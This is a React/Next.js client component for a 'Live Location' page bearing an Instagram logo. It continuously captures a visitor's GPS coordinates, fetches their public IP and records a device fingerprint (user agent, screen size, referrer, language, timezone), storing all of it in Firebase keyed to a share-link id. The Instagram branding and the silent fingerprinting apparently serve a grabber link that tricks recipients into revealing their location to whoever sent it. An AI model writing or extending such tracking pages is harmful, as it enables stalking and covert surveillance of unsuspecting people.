'use client'

import { useEffect, useState } from "react";
import { Card, CardHeader, CardTitle, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { database } from "@/lib/firebase";
import { ref, set, onValue, update } from "firebase/database";
import Map from "@/components/Map";
import axios from "axios";
import { useSearchParams } from "next/navigation";

import { Location } from "@/components/interfaces/location.interface";

export default function TrackClient() {
    const [coordinates, setCoordinates] = useState<string>("Fetching location...");
    const [isLoading, setIsLoading] = useState<boolean>(true);
    const [userLocation, setUserLocation] = useState<Location | undefined>(undefined);
    const [ip, setIP] = useState("");

    //search params
    const searchParams = useSearchParams();

    const getIP = async () => {
        const res = await axios.get("https://api.ipify.org/?format=json");
        setIP(res.data.ip);
        console.log(res.data.ip);
        return res.data.ip;
    };

    useEffect(() => {
        if (!ip) getIP();  // Ensure IP is fetched

        const getUserLocation = async () => {
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition(saveLocationToFirebase, handleLocationError);
            } else {
                setCoordinates("Geolocation is not supported by this browser.");
                setIsLoading(false);
            }
        };

        const handleLocationError = (error: GeolocationPositionError) => {
            setCoordinates(`Error: ${error.message}`);
            setIsLoading(false);
        };

        const saveLocationToFirebase = async (position: GeolocationPosition) => {
            const { latitude, longitude } = position.coords;
            try {
                const deviceId = localStorage.getItem('deviceId') || crypto.randomUUID();
                localStorage.setItem('deviceId', deviceId);

                console.log(ip);

                const shareLinkId = searchParams.get("id");
        
                const locationData = {
                    latitude,
                    longitude,
                    nickname: "",
                    userId: "anonymous",
                    shareLinkId: shareLinkId,
                    ip: await getIP(),
                    deviceId,
                    deviceType: /Mobi/.test(navigator.userAgent) ? "Mobile" : "Desktop",
                    userAgent: navigator.userAgent,
                    screenWidth: window.screen.width,
                    screenHeight: window.screen.height,
                    referrer: document.referrer,
                    userLanguage: navigator.language,
                    userTimezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    updatedAt: Date.now(),  // updatedAt for each update
                };
                console.log(locationData);

                const locationRef = ref(database, `locations/${deviceId}`);
                
                // Read existing entry first
                onValue(locationRef, (snapshot) => {
                    const existingData = snapshot.val();
        
                    // If data exists, update `updatedAt`, otherwise add `createdAt` and `updatedAt`
                    if (existingData) {
                        // Only update `updatedAt` and other necessary fields
                        const updatedLocationData = {
                            ...locationData,
                            createdAt: existingData.createdAt ?? Date.now(),  // Use existing `createdAt` or fallback to currentTimestamp
                        };
        
                        update(locationRef, updatedLocationData)
                            .catch(error => console.error("Update failed: ", error));
                    } else {
                        // Set both `createdAt` and `updatedAt` for new entry
                        set(locationRef, {
                            ...locationData,
                            createdAt: Date.now(),  // Set createdAt on first entry
                            updatedAt: Date.now(),
                        })
                        .catch(error => console.error("Set failed: ", error));
                    }
        
                    setCoordinates(`Latitude: ${latitude.toFixed(6)}, Longitude: ${longitude.toFixed(6)}`);
                    setIsLoading(false);
                    setUserLocation({ latitude: latitude, longitude: longitude });
                }, { onlyOnce: true });
        
            } catch (error: unknown) {
                const errorMessage = error instanceof Error ? error.message : 'Unknown error occurred';
                setCoordinates(`Unable to retrieve IP address. Error details: ${errorMessage}`);
                console.error('IP fetch error:', error);
                setIsLoading(false);
            }
        };
        getUserLocation();
    }, [ip, searchParams]);  // Added searchParams to dependency array

    return (
        <div className="flex flex-col items-center justify-center min-h-screen bg-white">
            <Card className="w-96">
                <CardHeader className="flex justify-between items-center border-b border-gray-200">
                    <CardTitle className="text-xl font-bold">Live Location</CardTitle>
                    <img
                        src="https://cdn-icons-png.flaticon.com/512/174/174855.png"
                        alt="Instagram Logo"
                        className="w-6 h-6"
                    />
                </CardHeader>
                <CardContent>
                    <div id="map">
                        <div className="flex flex-col items-center overflow-hidden">
                           { userLocation && (
                           <Map userLocations={userLocation as Location} zoom={14}
                            center={[
                                userLocation?.latitude || 0,
                                userLocation?.longitude || 0,
                            ]} />
                            )}
                        </div>
                    </div>
                    <div className="location-info mt-4 text-center">
                        <p id="coords" className="text-sm text-gray-500">
                            {coordinates}
                        </p>
                        <p id="ip" className="text-sm text-gray-500">
                            {ip}
                        </p>
                        {isLoading && (
                            <div className="mt-2">
                                <Button variant="ghost" disabled>
                                    Loading...
                                </Button>
                            </div>
                        )}
                    </div>
                </CardContent>
            </Card>
        </div>
    );
}